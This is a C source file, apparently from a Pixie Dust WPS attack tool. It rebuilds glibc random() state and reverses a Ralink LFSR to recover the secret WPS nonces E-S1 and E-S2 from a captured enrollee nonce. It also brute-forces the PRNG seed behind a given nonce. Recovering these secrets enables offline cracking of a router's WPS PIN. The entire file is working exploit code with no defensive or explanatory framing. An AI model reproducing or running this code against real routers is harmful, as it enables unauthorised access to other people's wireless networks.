#include "pixie_prng.h"

#include <string.h>

#define RALINK_TAP 0x80000057u

void pixie_glibc_nonce(uint32_t seed, uint8_t out[16]) {
    uint32_t state[348];
    int64_t value = (int32_t)(seed ? seed : 1u);
    state[0] = (uint32_t)value;
    for (size_t i = 1; i < 31; ++i) {
        value = (16807 * value) % 2147483647;
        if (value < 0) value += 2147483647;
        state[i] = (uint32_t)value;
    }
    state[31] = state[0];
    state[32] = state[1];
    state[33] = state[2];
    for (size_t i = 34; i < 348; ++i) state[i] = state[i - 31] + state[i - 3];
    for (size_t i = 0; i < 4; ++i) {
        uint32_t word = state[344 + i] >> 1;
        out[i * 4] = (uint8_t)(word >> 24);
        out[i * 4 + 1] = (uint8_t)(word >> 16);
        out[i * 4 + 2] = (uint8_t)(word >> 8);
        out[i * 4 + 3] = (uint8_t)word;
    }
}

uint32_t pixie_glibc_first_word(uint32_t seed) {
    uint8_t nonce[16];
    pixie_glibc_nonce(seed, nonce);
    return ((uint32_t)nonce[0] << 24) | ((uint32_t)nonce[1] << 16) |
           ((uint32_t)nonce[2] << 8) | nonce[3];
}

bool pixie_find_glibc_nonce_seed(const uint8_t nonce[16], uint32_t start,
                                 uint32_t end, uint32_t *seed_out) {
    if (!nonce || !seed_out) return false;
    uint32_t high = start > end ? start : end;
    uint32_t low = start > end ? end : start;
    uint32_t first = ((uint32_t)nonce[0] << 24) | ((uint32_t)nonce[1] << 16) |
                     ((uint32_t)nonce[2] << 8) | nonce[3];
    uint8_t candidate[16];
    for (uint32_t seed = high;; --seed) {
        if (pixie_glibc_first_word(seed) == first) {
            pixie_glibc_nonce(seed, candidate);
            if (memcmp(candidate, nonce, 16) == 0) {
                *seed_out = seed;
                return true;
            }
        }
        if (seed == low) break;
    }
    return false;
}

static uint8_t ralink_read_forward(uint32_t *state) {
    uint8_t byte = 0;
    for (unsigned i = 0; i < 8; ++i) {
        uint32_t bit = *state & 1u;
        if (bit) *state = ((*state ^ RALINK_TAP) >> 1) | 0x80000000u;
        else *state >>= 1;
        byte = (uint8_t)((byte << 1) | bit);
    }
    return byte;
}

static uint32_t ralink_shift_in(uint32_t state, uint32_t bit) {
    return bit ? (((state << 1) ^ RALINK_TAP) | 1u) : state << 1;
}

static uint8_t ralink_read_backward(uint32_t *state) {
    uint8_t byte = 0;
    for (unsigned i = 0; i < 8; ++i) {
        uint32_t bit = *state >> 31;
        *state = ralink_shift_in(*state, bit);
        byte |= (uint8_t)(bit << i);
    }
    return byte;
}

void pixie_ralink_forward(uint32_t state, uint8_t *out, size_t len) {
    if (!out) return;
    for (size_t i = 0; i < len; ++i) out[i] = ralink_read_forward(&state);
}

bool pixie_ralink_recover(const uint8_t nonce[16], uint8_t e_s1[16],
                          uint8_t e_s2[16]) {
    if (!nonce || !e_s1 || !e_s2) return false;
    uint32_t state = 0;
    for (int byte = 15; byte >= 0; --byte) {
        for (unsigned bit = 0; bit < 8; ++bit)
            state = ralink_shift_in(state, (nonce[byte] >> bit) & 1u);
    }
    uint8_t check[16];
    pixie_ralink_forward(state, check, sizeof(check));
    if (memcmp(check, nonce, sizeof(check)) != 0) return false;
    for (int i = 15; i >= 0; --i) e_s2[i] = ralink_read_backward(&state);
    for (int i = 15; i >= 0; --i) e_s1[i] = ralink_read_backward(&state);
    return true;
}
